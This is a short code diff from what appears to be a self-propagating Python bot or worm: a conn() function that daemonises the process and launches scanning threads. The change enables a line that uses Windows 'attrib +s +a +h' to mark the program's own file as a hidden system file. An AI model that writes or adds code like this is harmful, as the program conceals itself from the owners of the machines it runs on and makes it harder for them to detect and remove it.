@@ -324,8 +324,8 @@ def conn():
 			daemon()#can't use in windows
 			#clean_device()
 		else:
-			pass
-			#os.system("attrib +s +a +h "+sys.argv[0])#hide the file
+			#pass
+			os.system("attrib +s +a +h "+sys.argv[0])#hide the file
 	global kill
 	kill = False
 	for _ in range(scan_th):
